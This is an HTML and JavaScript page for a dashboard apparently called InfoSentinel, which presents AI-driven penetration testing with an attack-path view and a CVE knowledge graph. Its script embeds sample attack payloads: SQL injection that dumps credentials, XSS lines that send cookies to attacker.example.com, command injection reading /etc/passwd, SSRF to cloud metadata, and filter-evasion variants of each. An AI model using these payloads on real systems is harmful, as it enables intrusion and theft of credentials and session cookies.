<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>InfoSentinel - Elite Mobile & IoT Security Testing</title>
  <link rel="stylesheet" href="enterprise.css?v=1.0">
    <link rel="stylesheet" href="cyber-design-system.css?v=3.0">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@300;400;500;600;700&display=swap" rel="stylesheet">
    <script src="https://cdn.jsdelivr.net/npm/chart.js"></script>
    <script src="https://d3js.org/d3.v7.min.js"></script>
    <style>
        .ai-container {
            padding: var(--space-xl);
            max-width: 1400px;
            margin: 0 auto;
        }
        .ai-card {
            background: var(--bg-glass);
            backdrop-filter: blur(20px);
            border: 1px solid rgba(255, 255, 255, 0.1);
            border-radius: var(--radius-xl);
            box-shadow: var(--shadow-lg);
            margin-bottom: var(--space-xl);
            padding: var(--space-xl);
            transition: all var(--transition-normal);
            position: relative;
            overflow: hidden;
        }
        .ai-card::before {
            content: '';
            position: absolute;
            top: 0;
            left: 0;
            right: 0;
            height: 1px;
            background: linear-gradient(90deg, transparent, var(--cyber-primary), transparent);
            opacity: 0;
            transition: opacity var(--transition-normal);
        }
        .ai-card:hover {
            transform: translateY(-2px);
            box-shadow: var(--shadow-xl), var(--shadow-glow);
            border-color: rgba(0, 212, 255, 0.3);
        }
        .ai-card:hover::before {
            opacity: 1;
        }
        .ai-card h3 {
            color: var(--text-primary);
            font-family: var(--font-mono);
            font-weight: var(--font-semibold);
            font-size: var(--text-xl);
            margin-top: 0;
            border-bottom: 1px solid rgba(0, 255, 136, 0.2);
            padding-bottom: var(--space-md);
            margin-bottom: var(--space-lg);
        }
        .attack-path {
            display: flex;
            overflow-x: auto;
            padding: var(--space-lg) 0;
            gap: var(--space-lg);
        }
        .attack-step {
            min-width: 280px;
            padding: var(--space-lg);
            background: var(--bg-tertiary);
            border-radius: var(--radius-lg);
            border-left: 4px solid var(--cyber-secondary);
            border: 1px solid rgba(255, 255, 255, 0.1);
            transition: all var(--transition-normal);
            position: relative;
        }
        .attack-step:hover {
            transform: translateY(-2px);
            border-left-color: var(--cyber-primary);
            box-shadow: var(--shadow-glow);
        }
        .attack-step h4 {
            margin-top: 0;
            color: var(--cyber-secondary);
            font-family: var(--font-mono);
            font-weight: var(--font-semibold);
            font-size: var(--text-lg);
        }
        .attack-step p {
            font-size: var(--text-sm);
            color: var(--text-secondary);
            line-height: var(--leading-relaxed);
        }
        .attack-step .confidence {
            font-weight: var(--font-bold);
            color: var(--cyber-primary);
            font-family: var(--font-mono);
        }
        .payload-container {
            background: var(--bg-secondary);
            border: 1px solid rgba(0, 255, 136, 0.2);
            border-radius: var(--radius-lg);
            padding: var(--space-lg);
            font-family: var(--font-mono);
            overflow-x: auto;
            margin: var(--space-lg) 0;
            position: relative;
        }
        .payload-container::before {
            content: 'PAYLOAD';
            position: absolute;
            top: var(--space-sm);
            right: var(--space-md);
            font-size: var(--text-xs);
            color: var(--cyber-primary);
            font-weight: var(--font-bold);
            letter-spacing: 0.1em;
        }
        .payload-container pre {
            margin: 0;
            white-space: pre-wrap;
            color: var(--text-primary);
            font-size: var(--text-sm);
        }
        .payload-variations {
            display: flex;
            flex-wrap: wrap;
            gap: 1rem;
            margin-top: 1rem;
        }
        .payload-variation {
            flex: 1;
            min-width: 300px;
            background: #edf2f7;
            padding: 0.75rem;
            border-radius: 4px;
            font-family: monospace;
            font-size: 0.85rem;
        }
        .graph-container {
            height: 400px;
            margin: 1rem 0;
            border: 1px solid #eee;
            border-radius: 6px;
            overflow: hidden;
        }
        .controls {
            display: flex;
            gap: 1rem;
            margin-bottom: 1rem;
        }
        .controls select, .controls button {
            padding: 0.5rem 1rem;
            border-radius: 4px;
            border: 1px solid #ddd;
        }
        .controls button {
            background: #3498db;
            color: white;
            border: none;
            cursor: pointer;
        }
        .controls button:hover {
            background: #2980b9;
        }
        .status-indicator {
            display: inline-block;
            width: 10px;
            height: 10px;
            border-radius: 50%;
            margin-right: 0.5rem;
        }
        .status-success {
            background-color: #2ecc71;
        }
        .status-warning {
            background-color: #f39c12;
        }
        .status-danger {
            background-color: #e74c3c;
        }
        .metrics {
            display: flex;
            flex-wrap: wrap;
            gap: 1rem;
            margin: 1rem 0;
        }
        .metric-card {
            flex: 1;
            min-width: 150px;
            background: #f8f9fa;
            padding: 1rem;
            border-radius: 6px;
            text-align: center;
        }
        .metric-card .value {
            font-size: 2rem;
            font-weight: bold;
            color: #3498db;
        }
        .metric-card .label {
            font-size: 0.85rem;
            color: #7f8c8d;
        }
        .node {
            cursor: pointer;
        }
        .link {
            stroke: #999;
            stroke-opacity: 0.6;
        }
        .modal {
            display: none;
            position: fixed;
            z-index: 1000;
            left: 0;
            top: 0;
            width: 100%;
            height: 100%;
            background-color: rgba(0,0,0,0.5);
        }
        .modal-content {
            background-color: #fff;
            margin: 10% auto;
            padding: 2rem;
            border-radius: 8px;
            width: 80%;
            max-width: 800px;
            max-height: 80vh;
            overflow-y: auto;
        }
        .close {
            color: #aaa;
            float: right;
            font-size: 28px;
            font-weight: bold;
            cursor: pointer;
        }
        .close:hover {
            color: #000;
        }
    </style>
</head>
<body>
    <nav class="main-nav">
        <div class="logo">InfoSentinel</div>
        <ul>
            <li><a href="index.html">Home</a></li>
            <li><a href="scan.html">Pro Scan</a></li>
            <li><a href="reports.html">Reports</a></li>
            <li><a href="ai-pentest.html" class="active">AI Pentest</a></li>
        </ul>
    </nav>

    <div class="container ai-container">
        <h1>AI-Driven Penetration Testing</h1>
        <p class="subtitle">Leveraging advanced artificial intelligence to discover and exploit vulnerabilities</p>

        <div class="controls">
            <select id="target-select">
                <option value="web-server">Example Corp Web Server</option>
                <option value="cloud-app">Cloud Application</option>
                <option value="network">Corporate Network</option>
            </select>
            <button id="run-analysis">Run AI Analysis</button>
        </div>

        <div class="ai-card">
            <h3>Attack Path Analysis</h3>
            <p>The AI has identified the optimal attack path for the target system:</p>
            <div class="attack-path" id="attack-path">
                <!-- Attack path steps will be inserted here -->
            </div>
        </div>

        <div class="ai-card">
            <h3>Knowledge Graph Visualization</h3>
            <p>Interactive visualization of vulnerabilities, attack techniques, and their relationships:</p>
            <div class="graph-container" id="knowledge-graph"></div>
        </div>

        <div class="metrics">
            <div class="metric-card">
                <div class="value">87%</div>
                <div class="label">Success Probability</div>
            </div>
            <div class="metric-card">
                <div class="value">3</div>
                <div class="label">Critical Vulnerabilities</div>
            </div>
            <div class="metric-card">
                <div class="value">5</div>
                <div class="label">Attack Vectors</div>
            </div>
            <div class="metric-card">
                <div class="value">12</div>
                <div class="label">Security Controls</div>
            </div>
        </div>

        <div class="ai-card">
            <h3>Custom Payload Generator</h3>
            <p>AI-generated payloads tailored to the target environment:</p>
            
            <div class="controls">
                <select id="vulnerability-type">
                    <option value="sql_injection">SQL Injection</option>
                    <option value="xss">Cross-Site Scripting (XSS)</option>
                    <option value="command_injection">Command Injection</option>
                    <option value="ssrf">Server-Side Request Forgery</option>
                </select>
                <button id="generate-payload">Generate Payload</button>
            </div>
            
            <div class="payload-container">
                <pre id="primary-payload">-- Select a vulnerability type and click "Generate Payload" --</pre>
            </div>
            
            <h4>Payload Variations</h4>
            <div class="payload-variations" id="payload-variations">
                <!-- Payload variations will be inserted here -->
            </div>
        </div>
    </div>

    <!-- Modal for node details -->
    <div id="node-modal" class="modal">
        <div class="modal-content">
            <span class="close">&times;</span>
            <h2 id="modal-title">Node Details</h2>
            <div id="modal-content"></div>
        </div>
    </div>

    <script>
        // Sample data for demonstration
        const sampleAttackPath = [
            {
                id: "T1190",
                name: "Exploit Public-Facing Application",
                description: "Adversaries may attempt to exploit vulnerabilities in public-facing applications.",
                q_value: 0.85
            },
            {
                id: "CVE-2021-44228",
                name: "Log4Shell",
                description: "Remote code execution vulnerability in Apache Log4j",
                q_value: 0.78
            },
            {
                id: "T1059",
                name: "Command and Scripting Interpreter",
                description: "Adversaries may abuse command and script interpreters to execute commands.",
                q_value: 0.92
            },
            {
                id: "T1210",
                name: "Exploitation of Remote Services",
                description: "Adversaries may exploit remote services to gain unauthorized access to systems.",
                q_value: 0.67
            }
        ];

        const samplePayloads = {
            sql_injection: {
                primary_payload: "' UNION SELECT username,password FROM users --",
                variations: [
                    "' UN/*!50000*/ION SE/**/LECT username,password FR/**/OM users --",
                    "' %55NION %53ELECT username,password FROM users --",
                    "'/**/UNION/**/SELECT/**/username,password/**/FROM/**/users/**/ --"
                ],
                estimated_success_probability: 0.75
            },
            xss: {
                primary_payload: "&lt;script&gt;document.location='https://attacker.example.com/collect?c='+document.cookie&lt;/script&gt;",
                variations: [
                    "&lt;scr&lt;script&gt;ipt&gt;document.location='https://attacker.example.com/collect?c='+document.cookie&lt;/scr&lt;script&gt;ipt&gt;",
                    "&lt;svg/onload=eval&gt;document.location='https://attacker.example.com/collect?c='+document.cookie&lt;/svg&gt;",
                    "&lt;scr\\tipt&gt;document/**/location='https://attacker.example.com/collect?c='+document.cookie&lt;/scr\\tipt&gt;"
                ],
                estimated_success_probability: 0.68
            },
            command_injection: {
                primary_payload: "; cat /etc/passwd",
                variations: [
                    "; c\\a\\t /e\"\"tc/pa\"\"sswd",
                    "| c${z}at /et${z}c/pas${z}swd",
                    "; cat /e?c/p*swd"
                ],
                estimated_success_probability: 0.82
            },
            ssrf: {
                primary_payload: "http://169.254.169.254/latest/meta-data/",
                variations: [
                    "http://[::ffff:169.254.169.254]/latest/meta-data/",
                    "http://169.254.169.254%2f.latest/meta-data/",
                    "http://169.254.169.254\\latest\\meta-data\\"
                ],
                estimated_success_probability: 0.79
            }
        };

        // Function to render attack path
        function renderAttackPath(path) {
            const container = document.getElementById('attack-path');
            container.innerHTML = '';
            
            path.forEach((step, index) => {
                const stepElement = document.createElement('div');
                stepElement.className = 'attack-step';
                stepElement.innerHTML = `
                    <h4>${step.name}</h4>
                    <p>${step.description}</p>
                    <p class="confidence">Confidence: ${Math.round(step.q_value * 100)}%</p>
                    <small>${step.id}</small>
                `;
                container.appendChild(stepElement);
            });
        }

        // Function to render payload variations
        function renderPayloadVariations(payload) {
            const container = document.getElementById('payload-variations');
            container.innerHTML = '';
            
            payload.variations.forEach((variation, index) => {
                const variationElement = document.createElement('div');
                variationElement.className = 'payload-variation';
                variationElement.innerHTML = `<pre>${variation}</pre>`;
                container.appendChild(variationElement);
            });
            
            // Update primary payload
            document.getElementById('primary-payload').textContent = payload.primary_payload;
        }

        // Function to create knowledge graph visualization
        function createKnowledgeGraph() {
            const width = document.getElementById('knowledge-graph').clientWidth;
            const height = document.getElementById('knowledge-graph').clientHeight;
            
            // Sample graph data
            const nodes = [
                { id: "A01:2021", name: "Broken Access Control", type: "vulnerability_category" },
                { id: "A03:2021", name: "Injection", type: "vulnerability_category" },
                { id: "A06:2021", name: "Vulnerable Components", type: "vulnerability_category" },
                { id: "CVE-2021-44228", name: "Log4Shell", type: "vulnerability" },
                { id: "CVE-2021-26084", name: "Confluence OGNL Injection", type: "vulnerability" },
                { id: "CVE-2021-34473", name: "ProxyShell", type: "vulnerability" },
                { id: "T1190", name: "Exploit Public-Facing Application", type: "attack_technique" },
                { id: "T1059", name: "Command and Scripting Interpreter", type: "attack_technique" },
                { id: "T1210", name: "Exploitation of Remote Services", type: "attack_technique" }
            ];
            
            const links = [
                { source: "CVE-2021-44228", target: "A03:2021", type: "belongs_to" },
                { source: "CVE-2021-44228", target: "A06:2021", type: "belongs_to" },
                { source: "CVE-2021-26084", target: "A03:2021", type: "belongs_to" },
                { source: "CVE-2021-34473", target: "A01:2021", type: "belongs_to" },
                { source: "T1190", target: "CVE-2021-44228", type: "exploits" },
                { source: "T1190", target: "CVE-2021-26084", type: "exploits" },
                { source: "T1190", target: "CVE-2021-34473", type: "exploits" },
                { source: "T1059", target: "CVE-2021-44228", type: "exploits" },
                { source: "T1210", target: "CVE-2021-34473", type: "exploits" }
            ];
            
            // Clear previous graph
            d3.select("#knowledge-graph").html("");
            
            // Create SVG
            const svg = d3.select("#knowledge-graph")
                .append("svg")
                .attr("width", width)
                .attr("height", height);
            
            // Create force simulation
            const simulation = d3.forceSimulation(nodes)
                .force("link", d3.forceLink(links).id(d => d.id).distance(100))
                .force("charge", d3.forceManyBody().strength(-300))
                .force("center", d3.forceCenter(width / 2, height / 2));
            
            // Create links
            const link = svg.append("g")
                .selectAll("line")
                .data(links)
                .enter().append("line")
                .attr("class", "link")
                .attr("stroke-width", d => d.type === "exploits" ? 2 : 1)
                .attr("stroke", d => d.type === "exploits" ? "#e74c3c" : "#3498db");
            
            // Create node groups
            const node = svg.append("g")
                .selectAll("g")
                .data(nodes)
                .enter().append("g")
                .attr("class", "node")
                .call(d3.drag()
                    .on("start", dragstarted)
                    .on("drag", dragged)
                    .on("end", dragended))
                .on("click", showNodeDetails);
            
            // Add circles to nodes
            node.append("circle")
                .attr("r", d => {
                    if (d.type === "vulnerability_category") return 12;
                    if (d.type === "vulnerability") return 10;
                    return 8;
                })
                .attr("fill", d => {
                    if (d.type === "vulnerability_category") return "#3498db";
                    if (d.type === "vulnerability") return "#e74c3c";
                    return "#2ecc71";
                });
            
            // Add labels to nodes
            node.append("text")
                .attr("dx", 15)
                .attr("dy", 4)
                .text(d => d.name)
                .style("font-size", "10px");
            
            // Update positions on simulation tick
            simulation.on("tick", () => {
                link
                    .attr("x1", d => d.source.x)
                    .attr("y1", d => d.source.y)
                    .attr("x2", d => d.target.x)
                    .attr("y2", d => d.target.y);
                
                node
                    .attr("transform", d => `translate(${d.x},${d.y})`);
            });
            
            // Drag functions
            function dragstarted(event, d) {
                if (!event.active) simulation.alphaTarget(0.3).restart();
                d.fx = d.x;
                d.fy = d.y;
            }
            
            function dragged(event, d) {
                d.fx = event.x;
                d.fy = event.y;
            }
            
            function dragended(event, d) {
                if (!event.active) simulation.alphaTarget(0);
                d.fx = null;
                d.fy = null;
            }
            
            // Node details modal
            function showNodeDetails(event, d) {
                const modal = document.getElementById("node-modal");
                const modalTitle = document.getElementById("modal-title");
                const modalContent = document.getElementById("modal-content");
                
                modalTitle.textContent = d.name;
                
                let content = `<p><strong>ID:</strong> ${d.id}</p>`;
                content += `<p><strong>Type:</strong> ${d.type}</p>`;
                
                if (d.type === "vulnerability") {
                    content += `<h3>Suggested Exploits</h3>`;
                    content += `<ul>`;
                    if (d.id === "CVE-2021-44228") {
                        content += `<li>T1190: Exploit Public-Facing Application (Confidence: 85%)</li>`;
                        content += `<li>T1059: Command and Scripting Interpreter (Confidence: 92%)</li>`;
                    } else if (d.id === "CVE-2021-26084") {
                        content += `<li>T1190: Exploit Public-Facing Application (Confidence: 78%)</li>`;
                    } else if (d.id === "CVE-2021-34473") {
                        content += `<li>T1190: Exploit Public-Facing Application (Confidence: 81%)</li>`;
                        content += `<li>T1210: Exploitation of Remote Services (Confidence: 67%)</li>`;
                    }
                    content += `</ul>`;
                }
                
                modalContent.innerHTML = content;
                modal.style.display = "block";
            }
            
            // Close modal
            document.querySelector(".close").addEventListener("click", () => {
                document.getElementById("node-modal").style.display = "none";
            });
            
            window.addEventListener("click", (event) => {
                const modal = document.getElementById("node-modal");
                if (event.target === modal) {
                    modal.style.display = "none";
                }
            });
        }

        // Initialize the page
        document.addEventListener("DOMContentLoaded", () => {
            // Render initial attack path
            renderAttackPath(sampleAttackPath);
            
            // Create knowledge graph
            createKnowledgeGraph();
            
            // Event listeners
            document.getElementById("run-analysis").addEventListener("click", () => {
                // Simulate loading
                document.getElementById("run-analysis").textContent = "Analyzing...";
                setTimeout(() => {
                    renderAttackPath(sampleAttackPath);
                    document.getElementById("run-analysis").textContent = "Run AI Analysis";
                }, 1500);
            });
            
            document.getElementById("generate-payload").addEventListener("click", () => {
                const vulnerabilityType = document.getElementById("vulnerability-type").value;
                const payload = samplePayloads[vulnerabilityType];
                renderPayloadVariations(payload);
            });
            
            // Handle window resize for graph
            window.addEventListener("resize", () => {
                createKnowledgeGraph();
            });
        });
    </script>
</body>
</html>